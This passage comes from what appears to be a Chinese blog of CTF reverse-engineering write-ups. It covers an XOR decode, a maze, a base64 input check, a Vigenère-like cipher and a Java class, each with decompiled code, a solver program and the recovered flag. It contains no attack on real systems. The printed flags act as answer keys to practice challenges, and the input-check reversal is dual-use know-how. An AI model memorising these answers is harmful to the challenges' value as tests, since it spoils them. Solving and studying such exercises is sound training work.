class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ida_chars[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">0x66</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x11</span>,</span><br><span class="line">                    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1F</span>,</span><br><span class="line">                    <span class="hljs-number">0x76</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0F</span>,</span><br><span class="line">                    <span class="hljs-number">0x47</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x4F</span></span><br><span class="line">            };</span><br><span class="line">    string flag;</span><br><span class="line">    flag+=ida_chars[<span class="hljs-number">0</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">33</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            flag+=(ida_chars[i]^ida_chars[i<span class="hljs-number">-1</span>]);</span><br><span class="line">        }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{QianQiuWanDai_YiTongJiangHu}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h4><p>和bugku的love是同一个题，不再赘述</p><h4 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h4><p>比较简单的的迷宫题，上下左右全部都标示的清清楚楚</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9kRI.png" alt="不一样的flag-1"></p><p>迷宫如下图</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9Azt.png" alt="不一样的flag-2"></p><figure class="highlight hsp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">*1111</span></span><br><span class="line"><span class="hljs-number">01000</span></span><br><span class="line"><span class="hljs-number">01010</span></span><br><span class="line"><span class="hljs-number">00010</span></span><br><span class="line"><span class="hljs-number">1111</span><span class="hljs-meta">#</span></span><br></pre></td></tr></tbody></table></figure><p>转换成5*5的方阵，*走到#即可</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">222441144222</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h4><p>IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpTZF.png" alt="刮开有奖-1"></p><p>sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位）</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// esi</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// ecx</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// edx</span></span><br><span class="line"></span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = a2; i &lt;= a3; a2 = i) {</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">        <span class="hljs-keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result) {</span><br><span class="line">            <span class="hljs-keyword">do</span> {</span><br><span class="line">                <span class="hljs-keyword">if</span> (v6 &gt; a1[result]) {</span><br><span class="line">                    <span class="hljs-keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="hljs-keyword">break</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] = a1[result];</span><br><span class="line">                    <span class="hljs-keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="hljs-keyword">break</span>;</span><br><span class="line">                    <span class="hljs-keyword">while</span> (a1[result] &lt;= v6) {</span><br><span class="line">                        <span class="hljs-keyword">if</span> (++i &gt;= result)</span><br><span class="line">                            <span class="hljs-keyword">goto</span> LABEL_13;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="hljs-keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="hljs-keyword">break</span>;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    a1[result] = a1[i];</span><br><span class="line">                }</span><br><span class="line">                --result;</span><br><span class="line">            } <span class="hljs-keyword">while</span> (i &lt; result);</span><br><span class="line">        }</span><br><span class="line">        LABEL_13:</span><br><span class="line">        a1[result] = v6;</span><br><span class="line">        <span class="hljs-built_in">decrypt</span>(a1, a2, i - <span class="hljs-number">1</span>);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">char</span> v9[<span class="hljs-number">20</span>] = {<span class="hljs-number">90</span>, <span class="hljs-number">74</span>, <span class="hljs-number">83</span>, <span class="hljs-number">69</span>, <span class="hljs-number">67</span>, <span class="hljs-number">97</span>, <span class="hljs-number">78</span>, <span class="hljs-number">72</span>, <span class="hljs-number">51</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>};</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    cout &lt;&lt; v9 &lt;&lt; endl;</span><br><span class="line">    <span class="hljs-built_in">decrypt</span>(v9, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; v9 &lt;&lt; endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出如图所示</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpIqU.png" alt="刮开有奖-2"></p><p>接着分析下面的部分</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( String == v9 + <span class="hljs-number">34</span>         <span class="hljs-comment">// 第一位等于51+34=85--&gt;'U'</span></span><br><span class="line">        &amp;&amp; v21 == v13         <span class="hljs-comment">//第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;'J'</span></span><br><span class="line">        &amp;&amp; <span class="hljs-number">4</span> * v22 - <span class="hljs-number">141</span> == <span class="hljs-number">3</span> * v11</span><br><span class="line">        &amp;&amp; v23 / <span class="hljs-number">4</span> == <span class="hljs-number">2</span> * (v16 / <span class="hljs-number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="hljs-built_in">strcmp</span>(v6, <span class="hljs-string">"ak1w"</span>)       <span class="hljs-comment">// 第6,7,8个字符base64之后，等于ak1w</span></span><br><span class="line">        &amp;&amp; !<span class="hljs-built_in">strcmp</span>(v7,<span class="hljs-string">"V1Ax"</span>)        <span class="hljs-comment">// 第3,4,5个字符，base64之后等于V1Ax</span></span><br><span class="line">   )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">MessageBoxA</span>(hDlg, <span class="hljs-string">"U g3t 1T!"</span>, <span class="hljs-string">"@_@"</span>, <span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><p>还多了两个条件就检验正确就可以了</p><p>得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{UJWP<span class="hljs-number">1</span>jMp}</span><br></pre></td></tr></tbody></table></figure><h4 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h4><p>这题没什么难度，IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl __noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span>, argv, envp);</span><br><span class="line">      v4 = <span class="hljs-built_in">getchar</span>();</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-string">'d'</span> &amp;&amp; v4 != <span class="hljs-string">'D'</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-built_in">Decry</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-string">'q'</span> || v4 == <span class="hljs-string">'Q'</span> )</span><br><span class="line">      <span class="hljs-built_in">Exit</span>();</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input fault format!"</span>);</span><br><span class="line">    v3 = <span class="hljs-built_in">getchar</span>();</span><br><span class="line">    <span class="hljs-built_in">putchar</span>(v3);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">Decry</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> src[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v12; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)src = <span class="hljs-string">'SLCDN'</span>;</span><br><span class="line">  v7 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  v8 = <span class="hljs-number">0</span>;</span><br><span class="line">  v9 = <span class="hljs-string">'wodah'</span>;</span><br><span class="line">  v10 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  v11 = <span class="hljs-number">0</span>;</span><br><span class="line">  text = <span class="hljs-built_in">join</span>(key3, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v9);         <span class="hljs-comment">// text=killshadow</span></span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(key, key1);                            <span class="hljs-comment">// key=key1='ADSFK'</span></span><br><span class="line">  <span class="hljs-built_in">strcat</span>(key, src);                             <span class="hljs-comment">// key='ADSFKNDCLS'</span></span><br><span class="line">  v2 = <span class="hljs-number">0</span>;</span><br><span class="line">  v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">getchar</span>();</span><br><span class="line">  v5 = <span class="hljs-built_in">strlen</span>(key);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( key[v3 % v5] &gt; <span class="hljs-string">'@'</span> &amp;&amp; key[v3 % v5] &lt;= <span class="hljs-string">'Z'</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="hljs-number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  }                                             <span class="hljs-comment">// 转换为小写</span></span><br><span class="line">                                                <span class="hljs-comment">// key='adsfkndcls'</span></span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input your flag:"</span>, src);</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="hljs-built_in">getchar</span>();</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-string">'\n'</span> )                           <span class="hljs-comment">// 遇到回车结束</span></span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-string">' '</span> )                            <span class="hljs-comment">// 跳过空格</span></span><br><span class="line">    {</span><br><span class="line">      ++v2;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">96</span> || v1 &gt; <span class="hljs-number">122</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">64</span> &amp;&amp; v1 &lt;= <span class="hljs-number">90</span> )              <span class="hljs-comment">// 大写字母</span></span><br><span class="line">          str2[v2] = (v1 - <span class="hljs-number">39</span> - key[v3++ % v5] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span>                                      <span class="hljs-comment">// 小写字母</span></span><br><span class="line">      {</span><br><span class="line">        str2[v2] = (v1 - <span class="hljs-number">39</span> - key[v3++ % v5] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(<span class="hljs-number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulation!\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Try again!\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v12;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> n = <span class="hljs-number">0</span>, v5 = <span class="hljs-number">10</span>, v3 = <span class="hljs-number">10</span>, v2 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">char</span> v1;</span><br><span class="line">    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">11</span>] = {<span class="hljs-number">0</span>};</span><br><span class="line">    <span class="hljs-keyword">char</span> key[] = <span class="hljs-string">"adsfkndcls"</span>;</span><br><span class="line">    <span class="hljs-keyword">char</span> text[] = <span class="hljs-string">"killshadow"</span>;</span><br><span class="line"><span class="hljs-comment">//通过放缩，j只能取0-3之间</span></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) {</span><br><span class="line">        <span class="hljs-keyword">for</span> (v2 = <span class="hljs-number">0</span>; v2 &lt; <span class="hljs-number">10</span>; ++v2) {</span><br><span class="line">            v1 = text[v2] - <span class="hljs-number">97</span> + <span class="hljs-number">26</span> * j - <span class="hljs-number">97</span> + key[v3++ % v5] + <span class="hljs-number">39</span>;</span><br><span class="line">            <span class="hljs-keyword">if</span> ((v1 &gt;= <span class="hljs-number">65</span> &amp;&amp; v1 &lt;= <span class="hljs-number">90</span>) || (v1 &gt;= <span class="hljs-number">97</span> &amp;&amp; v1 &lt;= <span class="hljs-number">122</span>)) {</span><br><span class="line">                flag[v2] = v1;</span><br><span class="line">                <span class="hljs-keyword">if</span> (++n == <span class="hljs-number">10</span>) {</span><br><span class="line">                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"flag{%s}\n"</span>, flag);</span><br><span class="line">                    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{KLDQCUDFZO}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h4><p>第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的</p><p>附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Reverse</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        Scanner s = <span class="hljs-keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Please input the flag ："</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="hljs-string">"Your input is ："</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="hljs-keyword">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[] arr)</span> </span>{</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="hljs-keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; ++i) {</span><br><span class="line">            <span class="hljs-keyword">int</span> result = arr[i] + <span class="hljs-number">64</span> ^ <span class="hljs-number">32</span>;</span><br><span class="line">            Resultlist.add(result);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">int</span>[] KEY = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]{<span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>, <span class="hljs-number">137</span>, <span class="hljs-number">147</span>, <span class="hljs-number">191</span>, <span class="hljs-number">148</span>, <span class="hljs-number">136</span>, <span class="hljs-number">133</span>, <span class="hljs-number">191</span>, <span class="hljs-number">134</span>, <span class="hljs-number">140</span>, <span class="hljs-number">129</span>, <span class="hljs-number">135</span>, <span class="hljs-number">191</span>, <span class="hljs-number">65</span>};</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="hljs-keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; KEY.length; ++j) {</span><br><span class="line">            KEYList.add(KEY[j]);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"Result:"</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> 